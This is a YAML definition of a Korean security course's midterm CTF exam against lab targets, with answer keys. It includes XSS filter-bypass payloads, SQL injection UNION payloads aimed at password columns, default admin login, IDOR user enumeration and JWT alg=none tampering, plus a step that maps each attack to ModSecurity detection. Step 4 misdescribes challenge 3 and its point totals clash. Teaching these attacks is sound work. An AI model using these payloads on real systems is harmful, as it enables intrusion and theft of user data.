lab_id: standalone-attack-week08
title: 중간고사 — CTF 3 챌린지 (90분, 100점)
version: standalone-non-ai
course: attack
week: 8
description: |
  W01-W07 의 종합 평가. 3 챌린지 × 30점 + 시간 보너스 10점.
difficulty: hard
duration_minutes: 90
prerequisites: [W01-W07 통과]
pass_threshold: 0.5
steps:

  - order: 1
    instruction: |
      ## 🎯 챌린지 1 (30점) — Reflected XSS bypass

      juice.6v6.lab 의 XSS payload 5 변형 시도 + 가장 효과적인 우회 찾기.

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker '
      for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p")
        echo "$code | $p"
      done
      '
      ```

      ## 📋 평가 (각 6점)

      1. 5 변형 모두 시도
      2. 응답 코드 매트릭스 정확
      3. 가장 효과적인 우회 식별
      4. ModSec 941 룰 매치 분석
      5. 운영 권장 (paranoia 2 / exception)
    hint: XSS 5 변형 + 매트릭스
    category: exam
    points: 30
    answer: |
      ssh 6v6-attacker '
      for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p")
        echo "$code | $p"
      done
      '
    answer_detail: XSS 5 변형 매트릭스.
    verify:
      type: output_contains
      expect: '4'
      field: stdout
      semantic:
        intent: "XSS bypass"
        success_criteria: ["5 변형"]
        acceptable_methods: ["**[OSS] case mixing / nested / encoding**"]
    target_vm: attacker

  - order: 2
    instruction: |
      ## 🎯 챌린지 2 (30점) — SQLi data exfil 시도

      DVWA / JuiceShop 의 SQLi → ModSec 차단 분석 + 우회 시도.

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker '
      for p in "1+UNION+SELECT+1,user,3,4,5+FROM+users--" "1/**/UNION/**/SELECT/**/null,password+FROM+users" "1'+UNION+SELECT+1--"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.6v6.lab" "http://10.20.30.1/?q=$p")
        echo "$code | $p"
      done
      '
      ```

      ## 📋 평가

      1. 3 변형 시도
      2. ModSec 942 룰 매치 분석
      3. tamper script 권장
      4. 우회 가능성 평가
      5. 운영 측 권장
    hint: SQLi 변형 + tamper
    category: exam
    points: 30
    answer: |
      ssh 6v6-attacker '
      for p in "1+UNION+SELECT+1,user,3,4,5+FROM+users--" "1/**/UNION/**/SELECT/**/null,password+FROM+users"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.6v6.lab" "http://10.20.30.1/?q=$p")
        echo "$code | $p"
      done
      '
    answer_detail: SQLi 변형 + 우회 시도.
    verify:
      type: output_contains
      expect: UNION
      field: stdout
      semantic:
        intent: "SQLi exfil"
        success_criteria: ["변형 시도"]
        acceptable_methods: ["**[OSS] tamper space2comment**"]
    target_vm: attacker

  - order: 3
    instruction: |
      ## 🎯 챌린지 3 (30점) — IDOR + JWT

      JuiceShop 의 IDOR 시퀀스 + JWT 변조 시도. 2 단계 — (a) login 으로 JWT 획득 →
      (b) JWT 로 `/api/Users/{id}` 시퀀스 → (c) JWT payload 변조 시도.

      ## 💻 실행 가이드 (학생이 직접 작성)

      - JuiceShop default 자격: `admin@juice-sh.op` / `admin123` (또는 무작위 가입)
      - login endpoint: `POST /rest/user/login` (JSON body) → `authentication.token`
      - IDOR 시퀀스: `GET /api/Users/{1..5}` + Authorization header 의 Bearer token
      - JWT 변조: header 의 `alg` 를 `none` 으로 변조 + payload 의 `role` 을 `admin`
        으로 변경 → 서명 우회 검증

      ## 📋 평가 (각 6점)

      1. login 으로 JWT 획득 + token 의 3 segment (header.payload.sig) 디코드
      2. 5 user `/api/Users/{id}` 응답 비교 — *다른 user 의 PII* 누출 검출
      3. JWT 변조 (alg=none 또는 weak secret) 시도 + 결과 분석
      4. 인증 우회 vs 권한 검증 우회 의 차이 인지
      5. 운영 측 권장 — 인증 미들웨어 + RBAC + JWT 서명 검증 의 *함께* 적용

      ## 비정상 시 대응

      - **401 UnauthorizedError** — Authorization header 누락 또는 token expired.
        login 재시도 → 새 token.
      - **403** — ModSec 가 JWT payload 의 SQL/XSS 키워드 차단. payload 인코딩
        (base64 standard vs url-safe) 확인.
    hint: |
      1) login API → JWT token 획득  2) `Authorization: Bearer <token>` 로 IDOR
      3) JWT 의 alg=none 변조 시도. 시험 — 답 직접 작성.
    category: exam
    points: 30
    answer: |
      ssh 6v6-attacker '
      TOK=$(curl -s -X POST -H "Content-Type: application/json" -H "Host: juice.6v6.lab" "http://10.20.30.1/rest/user/login" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" | python3 -c "import sys,json;print(json.load(sys.stdin)[\"authentication\"][\"token\"])")
      echo "token segments:"; echo "$TOK" | tr "." "\n" | head -2
      for id in 1 2 3 4 5; do
        echo "=== user $id ==="
        curl -s -H "Host: juice.6v6.lab" -H "Authorization: Bearer $TOK" "http://10.20.30.1/api/Users/$id" | head -c 200
        echo
      done
      '
    answer_detail: |
      JWT login → token 의 3 segment → 5 user IDOR (Bearer header). admin token
      이라 5 user 모두 PII 노출 — *admin role 의 권한 분리 결함* 확인. alg=none
      변조 시 Juice Shop 버전에 따라 우회 가능/차단.
    verify:
      type: output_contains
      expect: user
      field: stdout
      semantic:
        intent: "IDOR + JWT"
        success_criteria: ["5 user"]
        acceptable_methods: ["**[OSS] Burp Intruder Sniper**"]
    target_vm: attacker

  # ============================================================
  # STEP 4 — R/B/P 종합 (중간고사 답안)
  # ============================================================
  - order: 4
    instruction: |
      ## 🎯 MISSION (R/B/P 종합) — CTF 3 챌린지 의 R/B/P 답안

      Red = 3 챌린지 의 reproduction / Blue = audit log 의 매치 / Purple = 보고서.

      ## 📖 시나리오 상세

      ### 🔴 Red Team — 중간고사 CTF 3 챌린지

      **페르소나**: 중간고사 응시자 = 본인. W01-W07 의 학습 의 통합 검증. 90분 의
      time-boxed CTF.

      **공격 의도** (challenge 별):
      1. Challenge 1 = XSS (W05) 의 reproduction + CVSS
      2. Challenge 2 = SQLi (W04) 의 reproduction + ModSec 분석
      3. Challenge 3 = brute (W06) 의 reproduction + rate limit 분석

      **답안 형식** (per challenge):
      - 명령 정확 (10점) + 결과 캡쳐 (5점) + CVSS (5점) = 20점

      ### 🔵 Blue Team — 3 챌린지 의 detection 분석

      **탐지 source 매핑**:
      - challenge 1 XSS = ModSec 941
      - challenge 2 SQLi = ModSec 942
      - challenge 3 brute = rate limit + Wazuh

      **답안 형식**:
      - 매치 룰 식별 (10점) + audit log 분석 (5점) + alert flow (5점) = 20점

      ### 🟣 Purple Team — 3 챌린지 의 권장

      **답안 형식**:
      - 즉시 (5점) + 단기 (10점) + 장기 (5점) = 20점

      ### 채점 환산
      - 3 challenge × 60점 = 180점
      - 환산 100점

      ## 💻 markdown 작성
      ```bash
      cat << 'EOF' > /tmp/midterm_rbp.md
      # 중간고사 R/B/P 답안
      ## Challenge 1
      Red: curl XSS → 403 / Blue: ModSec 941 / Purple: CSP 권장
      ## Challenge 2
      Red: sqlmap UNION → 403 / Blue: ModSec 942 / Purple: paranoia 3
      ## Challenge 3
      Red: hydra brute → rate / Blue: rate limit / Purple: RBA
      EOF
      echo "Coverage: 3 챌린지 × R/B/P self-grading"
      ```
    hint: 'markdown 의 3 챌린지 답안'
    category: rbp_integration
    points: 4
    answer: |
      cat << 'EOF' > /tmp/midterm_rbp.md
      # 중간고사 R/B/P
      C1 Red XSS / Blue 941 / Purple CSP
      C2 Red SQLi / Blue 942 / Purple paranoia
      C3 Red brute / Blue rate / Purple RBA
      EOF
      echo "Coverage: 3 챌린지 R/B/P"
    answer_detail: 중간고사 R/B/P 답안
    verify:
      type: output_contains
      expect: 'Coverage'
      field: stdout
      semantic:
        intent: 중간고사 R/B/P
        success_criteria: [3 챌린지, Coverage]
        acceptable_methods: ["**[관리적] markdown**"]
    target_vm: bastion
